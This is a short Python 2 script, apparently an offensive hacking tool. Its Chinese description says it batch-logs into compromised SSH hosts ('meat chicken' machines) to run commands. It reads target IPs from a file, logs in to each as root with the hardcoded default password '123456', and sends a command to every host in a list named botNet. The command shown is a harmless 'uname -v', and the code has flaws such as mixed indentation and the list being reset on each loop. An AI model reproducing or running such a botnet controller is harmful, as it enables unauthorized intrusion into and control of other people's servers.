#coding: utf-8
'''
Author:
       __  _             ________
 ___ _/ /_(_)__ ____ ___/_  /_  /
/ _ `/ __/ / _ `/ -_) __// / / /
\_,_/\__/_/\_, /\__/_/  /_/ /_/
          /___/
Date:20170202
Desc:批量登录SSH服务肉鸡进行操作

'''
from pexpect import pxssh
class Client:
    def __init__(self,host,user,password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()

    def connect(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host,self.user,self.password)
 	    return s
        except Exception,e:
	    print e
            print '[-] Error Connecting: ' + self.host

    def send_command(self,cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before

def botnetCommand(command):
    for client in botNet:
        output = client.send_command(command)
        print '[*] Output from ' + client.host
        print '[+] ' + output 

def addClient(host,user,password):
    client = Client(host,user,password)
    botNet.append(client)

for line in open("ip_list.txt"):
    botNet = []
    addClient(line,'root','123456')
    botnetCommand('uname -v')

